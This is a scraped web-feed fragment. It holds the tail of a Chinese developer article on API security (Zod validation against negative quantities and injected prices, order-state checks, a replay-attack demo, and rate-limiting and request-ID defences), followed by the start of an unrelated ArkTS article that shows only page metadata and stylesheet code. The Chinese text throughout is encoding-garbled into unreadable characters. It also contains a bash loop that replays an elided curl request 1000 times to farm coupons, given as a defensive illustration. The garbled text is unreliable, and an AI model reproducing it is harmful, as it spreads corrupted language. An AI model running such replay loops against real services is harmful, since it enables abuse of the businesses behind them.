<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-comment">// ä½¿ç”¨ Zod å®šä¹‰åç«¯æ ¡éªŒè§„åˆ™</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">OrderSchema</span> = z.<span class="hljs-title function_">object</span>({
  <span class="hljs-attr">productId</span>: z.<span class="hljs-title function_">string</span>(),
  <span class="hljs-comment">// å¼ºåˆ¶è¦æ±‚ quantity å¿…é¡»æ˜¯æ­£æ•´æ•°ï¼Œæ‹¦æˆª -100 è¿™ç§æ”»å‡»</span>
  <span class="hljs-attr">quantity</span>: z.<span class="hljs-title function_">number</span>().<span class="hljs-title function_">int</span>().<span class="hljs-title function_">positive</span>(), 
  <span class="hljs-comment">// æ³¨æ„ï¼šè¿™é‡Œæ ¹æœ¬ä¸æ¥æ”¶ price å­—æ®µï¼Œé˜²æ­¢è¢«æ³¨å…¥</span>
});

<span class="hljs-comment">// å¦‚æœæ ¡éªŒå¤±è´¥ï¼Œç›´æ¥æŠ›å‡º 400 é”™è¯¯ï¼Œé€»è¾‘æ ¹æœ¬è¿›ä¸å»</span>
<span class="hljs-keyword">const</span> data = <span class="hljs-title class_">OrderSchema</span>.<span class="hljs-title function_">parse</span>(req.<span class="hljs-property">body</span>); 
</code></pre>
<p><strong>3. æƒé™ä¸çŠ¶æ€æ ¡éªŒ</strong></p>
<p>ä¸è¦åªçœ‹æ•°æ®æ ¼å¼å¯¹ä¸å¯¹ï¼Œè¿˜è¦çœ‹äººå¯¹ä¸å¯¹ã€‚</p>
<ul>
<li>è¿™ä¸ªç”¨æˆ·æœ‰æƒé™ä¹°è¿™ä¸ªå•†å“å—ï¼Ÿ</li>
<li>è¿™ä¸ªè®¢å•ç°åœ¨çš„çŠ¶æ€å…è®¸æ”¯ä»˜å—ï¼Ÿï¼ˆé˜²æ­¢é‡å¤æ”¯ä»˜æ”»å‡»ğŸ¤”ï¼‰</li>
</ul>
<hr/>
<h4 data-id="heading-3"><strong>è¿˜æœ‰ä¸€ç§æ›´é«˜çº§çš„æ”»å‡»ï¼šReplay Attackï¼ˆé‡æ”¾æ”»å‡»ï¼‰</strong></h4>
<p>ä½ ä»¥ä¸ºæ ¡éªŒäº†æ•°æ®å°±å®‰å…¨äº†ï¼Ÿ</p>
<p>å¦‚æœæˆ‘æ‹¦æˆªäº†ä½ ä¸€æ¬¡é¢†ä¼˜æƒ åˆ¸çš„è¯·æ±‚ï¼Œè™½ç„¶æˆ‘æ”¹ä¸äº†æ•°æ®ï¼Œä½†æˆ‘å¯ä»¥ç”¨ <code>cURL</code> <strong>è¿ç»­è¿è¡Œ 1000 æ¬¡</strong>è¿™ä¸ªå‘½ä»¤ã€‚</p>
<pre><code class="hljs language-Bash" lang="Bash"><span class="hljs-comment"># ä¸€ä¸ªç®€å•çš„å¾ªç¯ï¼Œç¬é—´åˆ·çˆ†ä½ çš„æ¥å£</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> {1..1000}; <span class="hljs-keyword">do</span> curl ... ; <span class="hljs-keyword">done</span>
</code></pre>
<p>å¦‚æœä½ çš„åç«¯æ²¡æœ‰åš<strong>å¹‚ç­‰æ€§ï¼ˆIdempotencyï¼‰æ ¡éªŒæˆ–é¢‘ç‡é™åˆ¶ï¼ˆRate Limitingï¼‰</strong> ï¼Œé‚£æˆ‘ç¬é—´å°±èƒ½é¢†èµ° 1000 å¼ ä¼˜æƒ åˆ¸ã€‚</p>
<p><strong>é˜²å¾¡æ‰‹æ®µğŸ‘‡ï¼š</strong></p>
<ul>
<li><strong>Redis è®¡æ•°å™¨</strong>ï¼šé™åˆ¶æ¯ä¸ª IP/ç”¨æˆ· æ¯ç§’åªèƒ½è¯·æ±‚å‡ æ¬¡ã€‚</li>
<li><strong>å”¯ä¸€ Request ID</strong>ï¼šå¯¹äºå…³é”®æ“ä½œï¼Œè¦æ±‚å‰ç«¯ç”Ÿæˆä¸€ä¸ª UUIDï¼Œåç«¯å¤„ç†å®Œåè®°å½•ä¸‹æ¥ã€‚å¦‚æœåŒä¸€ä¸ª UUID å†æ¬¡è¯·æ±‚ï¼Œç›´æ¥æ‹’ç»ã€‚</li>
</ul>
<hr/>
<p>å¯¹äºå‰ç«¯å®‰å…¨ï¼Œ<strong>æ‰€æœ‰çš„è¾“å…¥éƒ½æ˜¯å¯ç–‘çš„ğŸ¤”</strong></p>
<p>ä½œä¸ºå…¨æ ˆæˆ–åç«¯å¼€å‘è€…ï¼Œå½“ä½ å†™ API æ—¶ï¼Œè¯·å¿˜æ‰ä½ é‚£ä¸ªæ¼‚äº®çš„å‰ç«¯ç•Œé¢ã€‚</p>
<p>ä½ çš„è„‘æµ·é‡Œåº”è¯¥åªæœ‰ä¸€å¹…ç”»é¢ï¼š</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3a55fc57d81d4e67b0e34d7cbc275e7f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765768894&amp;x-signature=PUzpEh39belMr9ROYxT7CYcHScs%3D" alt="image.png" loading="lazy"/></p>
<p>å±å¹•å¯¹é¢ï¼Œä¸æ˜¯ä¸€ä¸ªç‚¹é¼ æ ‡çš„ç”¨æˆ·ï¼Œè€Œæ˜¯ä¸€ä¸ªæ­£åœ¨æ•² cURL å‘½ä»¤çš„é»‘å®¢ã€‚</p>
<p>åªæœ‰è¿™æ ·ï¼Œä½ çš„ä»£ç æ‰ç®—çœŸæ­£å®‰å…¨äº†ğŸ˜’ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¯¹ç…§typescriptå­¦ä¹ é¸¿è’™ArkTS]]></title>    <link>https://juejin.cn/post/7581004702944935963</link>    <guid>https://juejin.cn/post/7581004702944935963</guid>    <pubDate>2025-12-08T03:21:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581004702944935963" data-draft-id="7580621397972418569" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¯¹ç…§typescriptå­¦ä¹ é¸¿è’™ArkTS"/> <meta itemprop="keywords" content="å‰ç«¯,HarmonyOS"/> <meta itemprop="datePublished" content="2025-12-08T03:21:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å˜´å¹³ä¼Šä¹‹è±¬"/> <meta itemprop="url" content="https://juejin.cn/user/2885545320261870"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¯¹ç…§typescriptå­¦ä¹ é¸¿è’™ArkTS
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2885545320261870/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å˜´å¹³ä¼Šä¹‹è±¬
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T03:21:54.000Z" title="Mon Dec 08 2025 03:21:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»13åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252b3a}.markdown-body ::selection{color:#fff;background-color:#ed7373}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-bottom:.6em;margin-top:1.5em;padding-bottom:4px;color:#ed7373}.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px;padding-bottom:12px;border-bottom:1px solid #dfe1e6}.markdown-body h3{font-size:18px}.markdown-body h4{font-size:16px}.markdown-body h5,.markdown-body h6{font-size:14px}.markdown-body p{line-height:inherit;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border-top:1px solid #dfe1e6;margin:33px 0}.markdown-body code{word-break:break-word;overflow-x:auto;background-color:rgba(239,198,221,.2666666667);color:#7b164f;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;border-radius:2px}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url("data:image/png;base64,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") 10px 10px no-repeat;background-size:40px;background-color:#fdf8f8}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#252b3a;background:#fdf8f8}.markdown-body a{position:relative;text-decoration:underline;text-decoration-color:#ffd4d4;color:#ed7373;padding-right:18px;padding-bottom:4px}.markdown-body a[href^=http]:after{position:absolute;display:inline-block;width:16px;height:16px;margin-left:2px;margin-top:6px;content:"";background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMgAAADICAYAAACtWK6eAAAAAXNSR0IArs4c6QAAD1lJREFUeF7tnV122zgShQHJG5gT9/OkV2J7JR3voI/U707eI5/eQeyVRFlJa56nc2YDFjkHEulWHP3g5xZYAK5eku6QYOFWfSwUAJLW8EcFqMBJBSy1oQJU4LQCBITRQQXOKEBAGB5UgIAwBqhAnALMIHG68axGFCAgjTia3YxTgIDE6cazGlGAgDTiaHYzTgECEqcbz2pEAQLSiKPZzTgFCEicbjyrEQUISCOOZjfjFCAgcbrxrEYUICCNOJrdjFOAgMTpxrMaUYCANOJodjNOAQISpxvPakQBAtKIo9nNOAUISJxuPKsRBQhII45GdfN/v//+/l9//rlBtae9HQKi3UOZ7ft7sfhgjfm3sfa9u3RvzHtrjPv77r8PfpvemB0o1v3Z95tuNvt29fKyqQkgApI5ADVebgeFtTfGmA8I+3pj1rbv17Ouey4dFgKCiIgC2/i+WDwYax0QbzMDtDcjLC67/PL58xraeIbGCEgGkTVd4vty+QWVKUL75WCZb7f3JWUVAhLq5UKPHzLGRyXmP822208lgEJAlESMlBlDfeGyhsafelAIiMawAdjkpmO38/kXa8wtoDnRJvq+v79+fHwSvUhk4wQkUjjNp/33jz9uZ33/VbONP9nW9x/fPT5+0mYzAdHmkUR7lNUaob1RN+QiIKEuVHz838vl1xKGVOck1DbTRUAUB7yvaSXVG5592sy22zsNs1wExNNjWg+rEI5XqWfb7a9TQ0JAtEa+h101wzF0f/JMQkA8AlHjIQ3AMco+KSQERGP0X7CpITj2Skw4BUxACgOkOThG/0wECQEpCJBm4Rh81Fl7l3tHMAEpBJCJ4Hjq+/7bvOt229THGSVny8vV1W6b/Kzrbnprb088VAVXN/fMFgGBuxDfYE443L4oB0TM9OqwxcVtjJR7xiTzUIuA4OMZ2mI2OICBN+wgfpACJWcWISDQcMY2lgMOt7XjerW6w1q+b03sqUUgzJf6TUAuKTTRv+eAI8f0qdSwK1cWISATAXDusjngyDkj5PrTzedu+z2uNsmURQiIMkBqg2OUVwKSHFmEgCgCpFY4xCDJkEUIiBJAaodjlBlZuEtOMIz2EhAFgLQCxxtIIG9YkR5mEZCJAWkNjldIlsu/EEW79AsfCMiEgLQKx8EaCSKLPL1bre6l3EhApJS90G7LcKCziOQwi4BMAAjh+GGlPTmLSK7pEJDMgBCOfwRHvb9Lsg4hIBkBIRw/i/0dUawLrocQkEyAEI7jQoPeNi9WqBOQDIAQjtMig16uTUAyxLHIJQjHeVkRdYjkijoziAgW+0YJx2VxEYAYYzbvVqtfL18t/AgCEq6Z1xmEw0um3U2km8/dqnrS791qJRLLIo0m9bSCkwmHvxNBgDCD+Es+7ZGEI0x/DrHC9Cr6aMIR7j7ELBaL9HDds59BOOIkB33wh9O8cfLnOYtwxOsM+egPV9LjHSB9JuFIU/j7ctmntSD7cmvOYiV6B3IHPGOD5E7VxK4nnw4q0A03Kya7QqYBwpGmK6j+MFJrIK53zCCRPgZtsjt59Zozh+s0aP3DNSW2BkJAIuFATE2eu3TtcLi+w24wggU6AYkABDVuPnXpFuAAZg8jrReHWAGQIB177LLSzg7oqtih4Dcsig6vmEECw0CyKG8BDic3VEPh4RUBCQAENePSaubY1R2LxYOxNvklDa8aEpCACBY+FLKgdcTGZjLHYvHBWuu+PoX6iQ+vmEE8XQW/8w3XJRyeDjhymOTi4OHlWKRf8JFUYU444uGQXvsgIAG+kcgesXAM6y83/fAhGtv36242+5b708i+8kmtF+XKHhxiTZA9YuDwCLSn2Xb7KebLtL7BHnqch82hTY7HZ6k9xotxiHXGTejsEQXHcvnVGnPrEU2b2XZ7pwESQTjEFwbf6kxAzgGCeOvf2H7ElGQMoDmHH8ekk4RD8snBU2FAQE4oAy7Og594S7p+BIweGeriIZJw5CzMWaRfdDV0UStqzByTPX7oVt9/nHXdc64hV41wsEjPMLyKqTucWZAtGZkyiTAc2esOZpBMs1cpY2bIW89dP4UhkYZj6pqKNcgRWFBb2lO+fAQDxBiTYse5e4k0HMaY4NrNY/QcdAgBOSJX8vjf3biNWV+vVndB3jg4GPZA0b5N+BSwNByp+sXqzmleD+UQgMTWHqN5AgEIg0TAtrdemTxzjAYxgxzLIMul23X6wYOlU4dEzVy9bQw5zNq1DahHpOGYuuZgBvGI+uQZJEAgOjOHWsjB+t7DbK9DUgIQkVnPGZmadb0ECDyIGeR4Bkl6mRnS0WhIYsf2LcLhQoOACACCfk8T+Dnu4BetJa3qe9yxkTcUj8sFHUJAjgPiPugSO6yB1B9vzUJCEppFBLPHprP2Xut2fWaQE/eSxOJYBJDR1ETbXnscUosk12THdVYPBwE5AUhiQIgCAswk3tO+As/ji2oUNIa6cDCHWOBp3tDhS4wzUZD4ZhEkIDn0idH01DkEBAyIaw5dpB9zHqgu8FqQgw3rEncXIAPft60qAXF32JRt3qnBJ7X36a1TUwPX926O2Pbiey3fwM11XBWADGsFv5n9o6m72SfnkJ2Iff98/fj4FCJo6mpxrmnLVJCdJj4wp+pRKhxVFOmeBXXwSw2S7s6glXQfqJPs3N0/+nufG0jCdbyGcT59neKYYjNIxKfPvGdtnCM8wTvpM587M8LhgOGPVwDHTAz4wofQQaqNIgGJgGOvX8CdPXVYEXKtFOcm2+k5zHI2hmx7yTXMTNHO59ziAEne9uAJCeChqaCM5eOsY8cA7PSqQw6vPWSt13rvjV1PnbXPmlfHQ7QuChBEMIQUjAnj7uCMFeI09GxW7N1+54+uuxkmRf4z77p1yuxhigZS5xYDCAKOUUTfdQrELFGOoVZqvRQLiFRQamq3CECQcPhObY5OSs4iATNFsYGRamMNxXSsdpfOUw8IGg4nSMgdE5JFhCEhIJfCPP7fVQOCmKE5Ik3wRrnUABxtkLpTJ9vnOXERH2blnqkWECE4ot42gsoiodnLN6wAmwm91kJ87anpOJWAABa/Tvso8m6ZfJf+xyLo9G/ytPduCqr/+O7x8VNNgY3qizpAROEwJnh4NQodskh20TnAgITUaEB7Lva9sANUAZI6XXlB++Q7N3KohdqKgrApZNKisPhONlcNIMJwBM1cnVMVEZDIWgShGwrW5GhU2IAKQBBOPqct+g4JqUcAwxpI/ZHpAS+Fse9l0qSARG869Ora/iA0HK7NmJ2tP5kMAASUzaLrsgA3FHvopICUljkOvZwKCQJcRCYL2ZtWbJQnGD4ZICXDMeo93MHdO3yD36Hlux/slG8hs1ec4r2IziSAgIYGJzuHuDtfVG44IGr6FzG8An1gNKdWvppqOi47ILA73wkVp3B4ICTJY37gDSbZFk3BLGFLVkBQsy6nhJgCjtEWn5oEMd6HagjIZBJBqanNbIBAHXtEwSnhODRn2EP2MPy/sTaBPWWHrN20aKYJiLe2ZANEcguJVkenvp/rrbOQcEz13XHNMByzLQsgktlDKxzoQADWHXvTOLzyclEWQMB3vteOtQKHxNZ/bi/x4kP+AzpS2YNw+Dn46FHMHt7iiWcQiexBOLz9e+xATu0GyCcKiMSaB+EI8O6xQ5k9ggQUBQSxV+iwN4QjyLfMHslyCX7EE157NHLnkyjIxziRemkEIA7VNiGWQcDTkk28VEAUjgI/XqOBGjFAgMV5E0WlJBxcFIxHTQQQ5PCqhbpDGo7ZdntX2ztz40M+7EwRQICzV9VnD2E4RJ6oDAuxso8WAQRVf9S+2isNB4vydDhlAFku+3TT4t9hBbi2eBPScBhjmpjYkHaUXkAqntaVhgPx3Il04JXSPhwQVIFe6/CKcJSCxt5OrYBUWZwTjrLgEAEEMYNV4xCBcJQHhwggoECoqsAEaXIywmq8oWjBCT7EgkzxVlSgEw4toR5nBwGJ083rLMLhJZPqg/CALJdfjDHubYPxvwoyCOGId7+mM+GAgAKj6BoEpAFrDgWkqASk5KKTcCiIaqAJcEBanuYlHMDIVNIUHJBWV9IJh5KIBpsBB8TZB/gssSlpJyrhAEelouakAPkr5psZb3QpolAnHIqiWcAUEUBQj9tq37BIOAQiUlmTMoAsFh+stW49JO2neD2EcKS5tpSzRQBBzGSNAmrMIoSjlPBOt1MEkKFQR9Qh6t5CTjjSg66kFiQBSd9yMiqpZKhFOEoKbYytYoAgh1muq1MPtQgHJuBKa0UMEOgwa6/qZqr3OxGO0sIaZ68sIIvFg7H2I87c/JBAnm85I0DJ+86AflXblCggAlkkayZBreec8j7hUMvFq2HygOCzyM54ya0obj/Zdj7/Yo25lXIh4ZBSFtuuOCBCWWQPiTHr+XZ7j3zvrHS9Mdp9vVrdYV3J1iQUyAOIUBY5EORptt1+SgFlAMN933z8trmE3juoCYeItCKNZgFEMoscquKCz/b9etZ1zz6wDFDcmP1QShQMZg6R+BVvNBsgw7qIWzwUD8RBtU1vzMb93Q5/DkH63u5tyGXH63CQmUM8nuEXyAbILovID7XgAiEa5LAKoeI0bWQFpEVICMc0gY26anZActUjKIFS2iEcKerpOHcSQIbn1r/mrgNySk44cqotd61JAHHdqRkSwiEXsLlbngwQ19EJZrbE9SUc4hJnvcCkgFQHiZLnVrJGUOUXmxyQUV/pjYHSfmzhc9XSGmpsXw0gBU8Bbzpr73/5/Hmt0cG0KU0BVYAcQOLeDp91pTtGRtYbMaqVdY46QMa6xPb9g+R282Q3sd5IlrCEBlQCMgqndJariDc+lhB8JdioGpDXAn7/IjrxregXHJa8pb6EgKCNPypQBCATg0IwGqamKEB+GHp13U1v7a3Q1vWnvu+/XT8+PjUcG+z6/lGJ8n+uVhmK+nHmK2QGzD0zsnZAzLtu7fOgVfmKsQe+ClQByLHOur1eL1dXO1Bs170C089mm6uXl92DVITBN0zaPa5aQNp1KXuOVICAINVkW9UpQECqcyk7hFSAgCDVZFvVKUBAqnMpO4RUgIAg1WRb1SlAQKpzKTuEVICAINVkW9UpQECqcyk7hFSAgCDVZFvVKUBAqnMpO4RUgIAg1WRb1SlAQKpzKTuEVICAINVkW9UpQECqcyk7hFSAgCDVZFvVKUBAqnMpO4RUgIAg1WRb1SlAQKpzKTuEVICAINVkW9UpQECqcyk7hFTg//8JNVC78ovQAAAAAElFTkSuQmCC");background-size:100%}.markdown-body a:active,.markdown-body a:hover{opacity:.66}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #ed7373;border-spacing:0}.markdown-body thead{color:#fff;text-align:left}.markdown-body thead tr{background:#ed7373}.markdown-body thead th{border-bottom:1px solid #dfe1e6}.markdown-body tr{background-color:#fff}.markdown-body tr:nth-child(2n){background-color:#fdf2f2}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#252b3a;padding:1px 23px;margin:22px 0;border-left:4px solid #ed7373;background-color:#fdf2f2}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{padding-left:10px;margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#ed7373}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}.markdown-body input[type=checkbox]{appearance:none;-webkit-appearance:none;-moz-appearance:none;outline:none;width:16px;height:16px;border-radius:2px;background-color:transparent;box-shadow:inset 0 0 0 1px rgba(28,31,35,.3490196078);vertical-align:middle;margin:0;transform:translateY(-2px)}.markdown-body input[type=checkbox]:checked{background-color:#ed7373;background-image:url("data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMjQgMjQiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjFlbSIgaGVpZ2h0PSIxZW0iIGFyaWEtaGlkZGVuPSJ0cnVlIj48cGF0aCBmaWxsLXJ1bGU9ImV2ZW5vZGQiIGNsaXAtcnVsZT0iZXZlbm9kZCIgZD0iTTE3LjQxMSA3LjMwOGExLjUgMS41IDAgMDEuMjggMi4xMDNsLTYuNSA4LjVhMS41IDEuNSAwIDAxLTIuMzc1LjAxbC0zLjUtNC41YTEuNSAxLjUgMCAxMTIuMzY4LTEuODQybDIuMzA2IDIuOTY1IDUuMzE4LTYuOTU1YTEuNSAxLjUgMCAwMTIuMTAzLS4yOHoiIGZpbGw9IiNmZmYiLz48L3N2Zz4=");box-shadow:inset 0 0 0 1px #ed7373}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" 